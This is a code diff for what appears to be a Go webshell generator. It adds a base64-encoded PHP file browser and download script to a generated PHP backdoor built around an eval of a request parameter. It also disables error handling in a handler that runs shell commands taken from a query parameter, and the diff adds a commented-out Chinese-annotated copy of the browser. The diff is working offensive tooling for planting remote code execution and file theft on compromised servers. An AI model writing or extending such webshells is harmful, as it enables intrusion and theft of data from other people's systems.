@@ -40,8 +40,8 @@ func (h myHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
     var err error
     queryValues, err := parseQuery(r.URL.RawQuery)
     if err != nil {
-        http.Error(w, err.Error(), http.StatusBadRequest)
-        return
+        // http.Error(w, err.Error(), http.StatusBadRequest)
+        // return
     }
     if cmd, ok := queryValues[h.shellCmd]; ok {
         cmdValue := cmd[0]
@@ -253,7 +253,118 @@ func banner(ip string, port int, shellCmd string,Dir string,code string) {
 //             }
 //         }
 //     }
-func dump_shell(mod string,cmd string,code string,shellcode string,ip string ,port int){
+
+// <?php
+
+// // 设置要浏览的根目录
+// $root_path = '/path/to/root/directory';
+
+// // 获取当前目录
+// $current_path = isset($_GET['path']) ? $_GET['path'] : '';
+
+// // 防止目录遍历攻击
+// $current_path = realpath($root_path . '/' . $current_path);
+
+// // 检查当前目录是否存在，如果不存在则返回404错误
+// if (!file_exists($current_path)) {
+//   header('HTTP/1.0 404 Not Found');
+//   exit;
+// }
+
+// // 列出当前目录中的所有文件和子目录
+// $files = scandir($current_path);
+
+// // 输出HTML页面头部
+// echo '<!DOCTYPE html>
+// <html>
+// <head>
+//   <title>文件浏览器</title>
+//   <style>
+//     table {
+//       border-collapse: collapse;
+//     }
+//     th, td {
+//       border: 1px solid black;
+//       padding: 5px;
+//     }
+//     th {
+//       background-color: #ddd;
+//     }
+//     a {
+//       text-decoration: none;
+//     }
+//     a:hover {
+//       text-decoration: underline;
+//     }
+//   </style>
+// </head>
+// <body>
+//   <h1>文件浏览器</h1>
+//   <p>当前目录：' . htmlspecialchars($current_path, ENT_QUOTES) . '</p>
+//   <table>
+//     <thead>
+//       <tr>
+//         <th>名称</th>
+//         <th>大小</th>
+//         <th>修改时间</th>
+//         <th>操作</th>
+//       </tr>
+//     </thead>
+//     <tbody>';
+
+// // 遍历文件和子目录，并输出表格行
+// foreach ($files as $file) {
+//   // 忽略隐藏文件和上级目录
+//   if ($file[0] === '.') {
+//     continue;
+//   }
+
+//   $file_path = $current_path . '/' . $file;
+//   $file_size = is_file($file_path) ? filesize($file_path) : '';
+//   $file_time = is_file($file_path) ? date('Y-m-d H:i:s', filemtime($file_path)) : '';
+
+//   echo '<tr>
+//           <td>' . htmlspecialchars($file, ENT_QUOTES) . '</td>
+//           <td>' . htmlspecialchars($file_size) . '</td>
+//           <td>' . htmlspecialchars($file_time) . '</td>
+//           <td>';
+
+//   if (is_file($file_path)) {
+//     // 如果是文件，输出下载链接
+//     echo '<a href="' . htmlspecialchars('?path=' . urlencode($current_path) . '&file=' . urlencode($file)) . '">下载</a>';
+//   } else {
+//     // 如果是目录，输出链接到子目录
+//     echo '<a href="' . htmlspecialchars('?path=' . urlencode($current_path . '/' . $file)) . '">进入</a>';
+//   }
+
+//   echo '</td>
+//         </tr>';
+// }
+
+// // 输出HTML页面尾部
+// echo '</tbody>
+//   </table>
+// </body>
+// </html>';
+
+// // 如果请求包含文件参数，则下载文件
+// if (isset($_GET['file'])) {
+//   $file_path = $current_path . '/' . $_GET['file'];
+
+//   // 检查文件是否存在，如果不存在则返回404错误
+//   if (!file_exists($file_path)) {
+//     header('HTTP/1.0 404 Not Found');
+//     exit;
+//   }
+
+//   // 设置响应头部，实现文件下载
+//   header('Content-Type: application/octet-stream');
+//   header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
+//   header('Content-Length: ' . filesize($file_path));
+//   readfile($file_path);
+//   exit;
+// }
+func dump_shell(mod string,cmd string,code string,shellcode string,dir string,ip string ,port int){
     // javashell:=""
     path:="./.path"
     
@@ -272,7 +383,13 @@ func dump_shell(mod string,cmd string,code string,shellcode string,ip string ,po
                 fmt.Println("Error decoding base64:", err)
                 return
             }
-            shell_php = "<?php eval($_REQUEST['"+code+"']);?>"+string(cmdshell)
+            explorer:="JGN1cnJlbnRfcGF0aCA9IGlzc2V0KCRfR0VUWydwYXRoJ10pID8gJF9HRVRbJ3BhdGgnXSA6ICcnOwoKLy8g6Ziy5q2i55uu5b2V6YGN5Y6G5pS75Ye7CiRjdXJyZW50X3BhdGggPSByZWFscGF0aCgkcm9vdF9wYXRoIC4gJy8nIC4gJGN1cnJlbnRfcGF0aCk7CgovLyDmo4Dmn6XlvZPliY3nm67lvZXmmK/lkKblrZjlnKjvvIzlpoLmnpzkuI3lrZjlnKjliJnov5Tlm540MDTplJnor68KaWYgKCFmaWxlX2V4aXN0cygkY3VycmVudF9wYXRoKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDA0IE5vdCBGb3VuZCcpOwogIGV4aXQ7Cn0KCi8vIOWIl+WHuuW9k+WJjeebruW9leS4reeahOaJgOacieaWh+S7tuWSjOWtkOebruW9lQokZmlsZXMgPSBzY2FuZGlyKCRjdXJyZW50X3BhdGgpOwoKLy8g6L6T5Ye6SFRNTOmhtemdouWktOmDqAplY2hvICc8IURPQ1RZUEUgaHRtbD4KPGh0bWw+CjxoZWFkPgogIDx0aXRsZT7mlofku7bmtY/op4jlmag8L3RpdGxlPgogIDxzdHlsZT4KICAgIHRhYmxlIHsKICAgICAgYm9yZGVyLWNvbGxhcHNlOiBjb2xsYXBzZTsKICAgIH0KICAgIHRoLCB0ZCB7CiAgICAgIGJvcmRlcjogMXB4IHNvbGlkIGJsYWNrOwogICAgICBwYWRkaW5nOiA1cHg7CiAgICB9CiAgICB0aCB7CiAgICAgIGJhY2tncm91bmQtY29sb3I6ICNkZGQ7CiAgICB9CiAgICBhIHsKICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgfQogICAgYTpob3ZlciB7CiAgICAgIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogICAgfQogIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CiAgPGgxPuaWh+S7tua1j+iniOWZqDwvaDE+CiAgPHA+5b2T5YmN55uu5b2V77yaJyAuIGh0bWxzcGVjaWFsY2hhcnMoJGN1cnJlbnRfcGF0aCwgRU5UX1FVT1RFUykgLiAnPC9wPgogIDx0YWJsZT4KICAgIDx0aGVhZD4KICAgICAgPHRyPgogICAgICAgIDx0aD7lkI3np7A8L3RoPgogICAgICAgIDx0aD7lpKflsI88L3RoPgogICAgICAgIDx0aD7kv67mlLnml7bpl7Q8L3RoPgogICAgICAgIDx0aD7mk43kvZw8L3RoPgogICAgICA8L3RyPgogICAgPC90aGVhZD4KICAgIDx0Ym9keT4nOwoKLy8g6YGN5Y6G5paH5Lu25ZKM5a2Q55uu5b2V77yM5bm26L6T5Ye66KGo5qC86KGMCmZvcmVhY2ggKCRmaWxlcyBhcyAkZmlsZSkgewogIC8vIOW/veeVpemakOiXj+aWh+S7tuWSjOS4iue6p+ebruW9lQogIGlmICgkZmlsZVswXSA9PT0gJy4nKSB7CiAgICBjb250aW51ZTsKICB9CgogICRmaWxlX3BhdGggPSAkY3VycmVudF9wYXRoIC4gJy8nIC4gJGZpbGU7CiAgJGZpbGVfc2l6ZSA9IGlzX2ZpbGUoJGZpbGVfcGF0aCkgPyBmaWxlc2l6ZSgkZmlsZV9wYXRoKSA6ICcnOwogICRmaWxlX3RpbWUgPSBpc19maWxlKCRmaWxlX3BhdGgpID8gZGF0ZSgnWS1tLWQgSDppOnMnLCBmaWxlbXRpbWUoJGZpbGVfcGF0aCkpIDogJyc7CgogIGVjaG8gJzx0cj4KICAgICAgICAgIDx0ZD4nIC4gaHRtbHNwZWNpYWxjaGFycygkZmlsZSwgRU5UX1FVT1RFUykgLiAnPC90ZD4KICAgICAgICAgIDx0ZD4nIC4gaHRtbHNwZWNpYWxjaGFycygkZmlsZV9zaXplKSAuICc8L3RkPgogICAgICAgICAgPHRkPicgLiBodG1sc3BlY2lhbGNoYXJzKCRmaWxlX3RpbWUpIC4gJzwvdGQ+CiAgICAgICAgICA8dGQ+JzsKCiAgaWYgKGlzX2ZpbGUoJGZpbGVfcGF0aCkpIHsKICAgIC8vIOWmguaenOaYr+aWh+S7tu+8jOi+k+WHuuS4i+i9vemTvuaOpQogICAgZWNobyAnPGEgaHJlZj0iJyAuIGh0bWxzcGVjaWFsY2hhcnMoJz9wYXRoPScgLiB1cmxlbmNvZGUoJGN1cnJlbnRfcGF0aCkgLiAnJmZpbGU9JyAuIHVybGVuY29kZSgkZmlsZSkpIC4gJyI+5LiL6L29PC9hPic7CiAgfSBlbHNlIHsKICAgIC8vIOWmguaenOaYr+ebruW9le+8jOi+k+WHuumTvuaOpeWIsOWtkOebruW9lQogICAgZWNobyAnPGEgaHJlZj0iJyAuIGh0bWxzcGVjaWFsY2hhcnMoJz9wYXRoPScgLiB1cmxlbmNvZGUoJGN1cnJlbnRfcGF0aCAuICcvJyAuICRmaWxlKSkgLiAnIj7ov5vlhaU8L2E+JzsKICB9CgogIGVjaG8gJzwvdGQ+CiAgICAgICAgPC90cj4nOwp9CgovLyDovpPlh7pIVE1M6aG16Z2i5bC+6YOoCmVjaG8gJzwvdGJvZHk+CiAgPC90YWJsZT4KPC9ib2R5Pgo8L2h0bWw+JzsKCi8vIOWmguaenOivt+axguWMheWQq+aWh+S7tuWPguaVsO+8jOWImeS4i+i9veaWh+S7tgppZiAoaXNzZXQoJF9HRVRbJ2ZpbGUnXSkpIHsKICAkZmlsZV9wYXRoID0gJGN1cnJlbnRfcGF0aCAuICcvJyAuICRfR0VUWydmaWxlJ107CgogIC8vIOajgOafpeaWh+S7tuaYr+WQpuWtmOWcqO+8jOWmguaenOS4jeWtmOWcqOWImei/lOWbnjQwNOmUmeivrwogIGlmICghZmlsZV9leGlzdHMoJGZpbGVfcGF0aCkpIHsKICAgIGhlYWRlcignSFRUUC8xLjAgNDA0IE5vdCBGb3VuZCcpOwogICAgZXhpdDsKICB9CgogIC8vIOiuvue9ruWTjeW6lOWktOmDqO+8jOWunueOsOaWh+S7tuS4i+i9vQogIGhlYWRlcignQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nKTsKICBoZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSInIC4gYmFzZW5hbWUoJGZpbGVfcGF0aCkgLiAnIicpOwogIGhlYWRlcignQ29udGVudC1MZW5ndGg6ICcgLiBmaWxlc2l6ZSgkZmlsZV9wYXRoKSk7CiAgcmVhZGZpbGUoJGZpbGVfcGF0aCk7CiAgZXhpdDsKfQ=="
+            explor, err := base64.StdEncoding.DecodeString(explorer)
+            if err != nil {
+                fmt.Println("Error decoding base64:", err)
+                return
+            }
+            shell_php = "<?php eval($_REQUEST['"+code+"']);?>"+string(cmdshell)+"$root_path='"+dir+"';"+string(explor)
         }else{
             shell_php = shellcode
         }
@@ -379,6 +496,6 @@ func main() {
             log.Fatal(err)
         }
     }else{
-        dump_shell(mod,shellCmd,code,payload,ip,port)
+        dump_shell(mod,shellCmd,code,payload,dir,ip,port)
     }
 }
